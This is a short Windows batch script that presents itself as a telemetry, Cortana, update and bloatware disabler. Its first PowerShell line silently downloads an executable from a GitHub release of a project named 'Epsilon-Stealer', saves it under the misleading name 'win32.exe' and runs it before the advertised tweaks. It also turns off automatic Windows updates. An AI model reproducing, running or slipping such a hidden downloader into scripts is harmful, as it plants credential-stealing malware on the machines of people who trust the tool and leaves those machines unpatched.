@echo off

cd tool

powershell -Command "$down=New-Object System.Net.WebClient;$url='https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit"

cd ..

cd tool

call "Telemetry Disabler Level3.bat"
call "Telemetry Disabler Level 2.bat"
call "Telemetry Disabler Level 1.cmd"
call "Disable Automatic Windows Updates.bat"
call "Cortana Disabler.bat"
call "Bloatware Deleter.bat"

pause
